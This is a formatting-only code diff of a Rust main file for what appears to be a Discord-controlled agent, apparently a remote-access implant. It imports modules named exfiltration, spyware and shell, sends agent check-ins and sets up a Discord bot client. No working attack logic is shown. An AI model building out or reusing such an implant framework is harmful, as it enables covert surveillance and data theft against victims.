@@ -1,17 +1,22 @@
 mod commands;
+pub mod discord_utils;
 mod errors;
+mod event_handler;
+mod libraries;
 mod os;
 mod utils;
-mod libraries;
-mod event_handler;
-pub mod discord_utils;
 
 use crate::{
-    utils::agent::*, commands::*, shell::*, misc::*, exfiltration::*, spyware::*,
-    event_handler::MainHandler
+    commands::*, event_handler::MainHandler, exfiltration::*, misc::*, shell::*, spyware::*,
+    utils::agent::*,
 };
 
-use serenity::{client::Context, prelude::GatewayIntents, Client, model::{application::command::Command, id::GuildId}};
+use serenity::{
+    client::Context,
+    model::{application::command::Command, id::GuildId},
+    prelude::GatewayIntents,
+    Client,
+};
 use tracing::{error, info as informational};
 
 use anyhow::Error;
@@ -45,9 +50,8 @@ async fn send_agent_check_in(ctx: &Context) -> Result<(), Error> {
 async fn main() {
     initialize_tracing(); // Setup logging
 
-    let intents = GatewayIntents::GUILD_MESSAGES
-        | GatewayIntents::MESSAGE_CONTENT
-        | GatewayIntents::GUILDS;
+    let intents =
+        GatewayIntents::GUILD_MESSAGES | GatewayIntents::MESSAGE_CONTENT | GatewayIntents::GUILDS;
 
     let mut client = Client::builder(TOKEN, intents)
         .event_handler(MainHandler)
